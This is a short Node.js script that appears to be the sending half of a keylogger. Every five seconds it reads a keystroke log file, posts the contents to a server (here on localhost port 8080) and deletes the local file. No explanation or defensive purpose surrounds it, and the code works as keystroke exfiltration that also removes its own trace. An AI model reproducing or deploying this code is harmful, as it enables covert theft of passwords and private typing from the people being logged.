var request = require('request'),
    fs = require('fs'),
    log_path = "/var/log/keystroke.log";



function sendData(){
  console.log("sending data");
  try{
    request.post("http://localhost:8080",
    {
      json: {content : fs.readFileSync(log_path)}
    });
    fs.unlinkSync(log_path);
  }catch(ex){
    console.log("failed to send", ex);
  }
}

setInterval(sendData, 5000);